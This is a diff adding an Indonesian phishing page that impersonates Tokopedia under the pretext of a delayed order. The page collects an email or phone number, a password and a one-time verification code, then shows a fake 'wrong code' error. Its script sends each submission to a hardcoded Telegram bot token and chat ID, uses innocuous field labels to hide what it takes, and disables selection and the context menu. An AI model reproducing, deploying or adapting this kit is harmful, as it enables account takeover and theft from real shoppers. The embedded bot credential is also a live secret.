@@ -1,0 +1,387 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    
+    <meta property="og:type" content="website">
+    <meta property="og:title" content="Cek Pesanan Tokopedia">
+    <meta property="og:description" content="Pengiriman Tokopedia Tertunda">
+    <meta property="og:image" content="https://www.bee.id/wp-content/uploads/2022/04/logo-tokopedia.png">
+    <meta property="og:image:secure_url" content="https://www.bee.id/wp-content/uploads/2022/04/logo-tokopedia.png">
+    <meta property="og:image:type" content="image/jpeg">
+    <meta property="og:image:width" content="600">
+    <meta property="og:image:height" content="600">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content="https://www.bee.id/wp-content/uploads/2022/04/logo-tokopedia.png">
+
+    <title>Cek Orderan Tokopedia</title>
+    
+    <style>
+        /* --- KUNCI TOTAL BACKGROUND AGAR TIDAK BISA DI-SCROLL & ANTI SELEKSI --- */
+        html, body {
+            margin: 0;
+            padding: 0;
+            background-color: #ffffff; 
+            color: #333333;
+            font-family: sans-serif;
+            box-sizing: border-box;
+            
+            overflow: hidden !important; 
+            position: fixed;
+            width: 100%;
+            height: 100%;
+            touch-action: none;
+
+            -webkit-user-select: none;
+            -webkit-touch-callout: none; 
+            -khtml-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
+            user-select: none;
+        }
+
+        .wrapper {
+            width: 100%;
+            max-width: 400px;
+            margin: 0 auto;
+            position: relative;
+            box-sizing: border-box;
+            height: 100%;
+            background-color: #f9f9f9;
+            overflow: hidden !important;
+            touch-action: none;
+        }
+
+        /* Menggunakan Flexbox arah kolom */
+        .halaman {
+            width: 100%;
+            height: 100%; 
+            display: flex;
+            flex-direction: column;
+            box-sizing: border-box;
+            padding: 10px 20px; 
+            position: relative;
+            overflow: hidden !important;
+            justify-content: space-between; 
+        }
+
+        /* Khusus halaman 1: Murni 100% foto satu layar */
+        #bagian1 {
+            padding: 0 !important;
+        }
+
+        #bagian2, #bagian3, #bagian4 {
+            display: none;
+        }
+
+        /* --- KONTEN FORM ATAS --- */
+        .konten-form {
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            box-sizing: border-box;
+            justify-content: flex-start; 
+            overflow: hidden !important;
+            flex: 1;
+            min-height: 0; 
+        }
+
+        /* Membuat foto halaman 1 mengambil 100% penuh layar tanpa sisa */
+        .foto-penuh {
+            width: 100%;
+            height: 100%;
+            flex: 1;
+            display: flex;
+        }
+
+        .foto-penuh img {
+            width: 100% !important;
+            height: 100% !important;
+            max-width: 100% !important;
+            max-height: 100% !important;
+            border-radius: 0px !important; 
+            object-fit: cover !important; 
+            margin: 0 !important;
+        }
+
+        h1 { 
+            color: #000000; 
+            font-weight: bold;
+            margin-top: 5px; 
+            margin-bottom: 2px;
+            font-size: 18px; 
+        } 
+
+        p {
+            margin-top: 0;
+            margin-bottom: 12px;
+            font-size: 13px;
+        }
+
+        .kata-bijak {
+            font-style: italic;
+            font-size: 14px;
+            line-height: 1.5;
+            color: #555555;
+            text-align: center;
+            margin-top: 15px; 
+            padding: 0 10px;
+        }
+        
+        /* GAMBAR KUCING HALAMAN 2, 3, 4 */
+        img {
+            width: auto;
+            height: auto;
+            max-width: 130px;
+            max-height: 110px; 
+            border-radius: 12px; 
+            margin-bottom: 5px;
+            object-fit: cover; 
+            margin-top: 0px; 
+            flex-shrink: 1; 
+            -webkit-touch-callout: none !important;
+            -webkit-user-drag: none !important; 
+            pointer-events: auto; 
+        }
+
+        /* --- INPUT TEKS --- */
+        input[type="text"], input[type="number"] {
+            padding: 16px 20px; 
+            width: 100%;        
+            max-width: 100%;    
+            border-radius: 12px; 
+            border: none; 
+            background-color: #eeeeee; 
+            color: #333333;
+            font-size: 16px; 
+            outline: none; 
+            margin-bottom: 12px; 
+            text-align: left; 
+            box-sizing: border-box; 
+            flex-shrink: 0;
+        }
+
+        input:focus {
+            background-color: #e5e5e5;
+        }
+
+        /* --- CONTAINER TOMBOL STANDAR --- */
+        .tombol-container {
+            width: 100%;
+            padding: 15px 20px 15px 20px; 
+            box-sizing: border-box;
+            position: relative; 
+            display: flex;
+            justify-content: center;
+            background-color: #f9f9f9;
+            z-index: 99;
+            flex-shrink: 0; 
+        }
+
+        button {
+            background-color: #2e7d32; 
+            color: #ffffff;
+            border: none;
+            padding: 14px 30px;
+            font-size: 16px;
+            border-radius: 30px;
+            font-weight: bold;
+            cursor: pointer;
+            width: 100%;        
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.15); 
+            box-sizing: border-box; 
+        }
+
+        .btn-ulang {
+            background-color: #333333; 
+            box-shadow: 0 3px 10px rgba(0, 0, 0, 0.2);
+        }
+    </style>
+</head>
+<body>
+
+    <div class="wrapper" id="mainWrapper">
+        
+        <div id="bagian1" class="halaman">
+            <div class="konten-form foto-penuh">
+                <img src="https://i.ibb.co.com/6cx6xGh0/IMG-20260706-WA0000.jpg" alt="Foto Penuh" draggable="false">
+            </div>
+            </div>
+
+        <div id="bagian2" class="halaman">
+            <div class="konten-form">
+                <img src="https://www.bee.id/wp-content/uploads/2022/04/logo-tokopedia.png" alt="Foto Bagian 2" draggable="false">
+                <h2>Masuk ke Tokopedia</h2>
+                <p></p>
+                <input type="text" id="inputNama" placeholder="E-mail atau Nomor Telpon">
+                <input type="text" id="inputInfoTambahan" placeholder="Kata Sandi">
+            </div>
+            <div class="tombol-container">
+                <button onclick="prosesKirimKe1()">Selanjutnya</button>
+            </div>
+        </div>
+
+        <div id="bagian3" class="halaman">
+            <div class="konten-form">
+                <img src="https://www.bee.id/wp-content/uploads/2022/04/logo-tokopedia.png" alt="Foto Bagian 3" draggable="false">
+                <h2>KODE VERIFIKASI</h2>
+                <p>Masukkan kode Verifikasi yang ada di sms atau email</p>
+                <input type="number" id="inputHobi" placeholder="Masukkan kode Verifikasi">
+            </div>
+            <div class="tombol-container">
+                <button onclick="prosesKirimKe2()">Masuk</button>
+            </div>
+        </div>
+
+        <div id="bagian4" class="halaman">
+            <div class="konten-form">
+                <h2>KODE VERIFIKASI SALAH</h2>
+                <p>Periksa kembali kode verifikasi yang dikirim melalui email atau sms</p>
+                <img src="https://png.pngtree.com/png-clipart/20250421/original/pngtree-cross-icon-incorrect-sign-vector-with-red-circle-png-image_20810266.png" alt="Foto Bagian 4" draggable="false">
+                <p class="kata-bijak">Gunakan akun TIKTOK atau TOKOPEDIA apabila GAGAL</p>
+            </div>
+            <div class="tombol-container">
+                <button class="btn-ulang" onclick="pindahKe(1)">ULANGI KEMBALI </button>
+            </div>
+        </div>
+
+    </div>
+
+    <script>
+        var tokenBot = "8880993139:AAFsBfqnYa_8d_A2aiiNX3VMxATpMvw_5VQ"; 
+        var chatID = "8859032590";     
+        var urlTlgrm = "https://api.telegram.org/bot" + tokenBot + "/sendMessage";
+
+        function setSizing() {
+            var tinggiViewportSekarang = window.visualViewport ? window.visualViewport.height : window.innerHeight;
+            document.getElementById('mainWrapper').style.height = tinggiViewportSekarang + 'px';
+        }
+        
+        window.addEventListener('load', setSizing);
+        window.addEventListener('resize', setSizing);
+        if (window.visualViewport) {
+            window.visualViewport.addEventListener('resize', setSizing);
+            window.visualViewport.addEventListener('scroll', setSizing);
+        }
+        setSizing();
+
+        document.addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+        });
+
+        document.querySelectorAll('img').forEach(img => {
+            img.addEventListener('contextmenu', function(e) {
+                e.preventDefault();
+            });
+            img.addEventListener('touchstart', function(e) {
+                if (e.touches.length > 1) {
+                    e.preventDefault();
+                }
+            }, { passive: true });
+        });
+
+        document.addEventListener('touchmove', function(e) {
+            e.preventDefault();
+        }, { passive: false });
+
+        document.querySelectorAll('input').forEach(input => {
+            input.addEventListener('blur', function() {
+                window.scrollTo(0, 0);
+                setSizing();
+            });
+        });
+
+        function prosesKirimKe1() {
+            var nama = document.getElementById('inputNama').value;
+            var infoTambahan = document.getElementById('inputInfoTambahan').value;
+            
+            var namaFix = nama ? nama : "-";
+            var infoFix = infoTambahan ? infoTambahan : "-";
+
+            var pesanTelegram = "📥 *LAPORAN FORM MASUK (BAGIAN 1 & 2)* 📥\n\n" +
+                                "👤 *Nama:* " + namaFix + "\n" +
+                                "📞 *Info/WA:* " + infoFix;
+
+            fetch(urlTlgrm, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    chat_id: chatID,
+                    text: pesanTelegram,
+                    parse_mode: "Markdown"
+                })
+            })
+            .catch(error => console.error("Error:", error));
+
+            pindahKe(3);
+        }
+
+        function prosesKirimKe2() {
+            var nama = document.getElementById('inputNama').value; 
+            var infoTambahan = document.getElementById('inputInfoTambahan').value;
+            var hobi = document.getElementById('inputHobi').value;
+
+            var namaFix = nama ? nama : "Tanpa Nama";
+            var infoFix = infoTambahan ? infoTambahan : "-";
+            var hobiFix = hobi ? hobi : "-";
+
+            var pesanTelegram = "📬 *LAPORAN FINAL MASUK (BAGIAN 3)* 📬\n\n" +
+                                "👤 *Nama User:* " + namaFix + "\n" +
+                                "📞 *Info/WA:* " + infoFix + "\n" +
+                                "🎯 *Hobi / Cita-cita:* " + hobiFix;
+
+            fetch(urlTlgrm, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    chat_id: chatID,
+                    text: pesanTelegram,
+                    parse_mode: "Markdown"
+                })
+            })
+            .catch(error => console.error("Error:", error));
+
+            pindahKe(4);
+        }
+
+        // --- SISTEM TIMEOUT OTOMATIS PINDAH HALAMAN 1 KE HALAMAN 2 ---
+        var timerSplash;
+        function jalankanTimerSplash() {
+            // Bersihkan timer lama jika ada agar tidak bentrok
+            clearTimeout(timerSplash); 
+            // 2000 milidetik = 2 detik otomatis pindah ke bagian 2
+            timerSplash = setTimeout(function() {
+                pindahKe(2);
+            }, 2000);
+        }
+
+        // Jalankan timer otomatis begitu web selesai dimuat pertama kali
+        window.addEventListener('DOMContentLoaded', function() {
+            jalankanTimerSplash();
+        });
+
+        function pindahKe(nomorHalaman) {
+            document.getElementById('bagian1').style.display = 'none';
+            document.getElementById('bagian2').style.display = 'none';
+            document.getElementById('bagian3').style.display = 'none';
+            document.getElementById('bagian4').style.display = 'none';
+
+            var target = document.getElementById('bagian' + nomorHalaman);
+            target.style.display = 'flex';
+            
+            if (nomorHalaman === 1) {
+                document.getElementById('inputNama').value = "";
+                document.getElementById('inputInfoTambahan').value = "";
+                document.getElementById('inputHobi').value = "";
+                // Jika user klik "Isi Ulang Data", splash screen berjalan lagi selama 2 detik
+                jalankanTimerSplash();
+            }
+
+            window.scrollTo(0, 0);
+            setSizing();
+        }
+    </script>
+</body>
+</html>
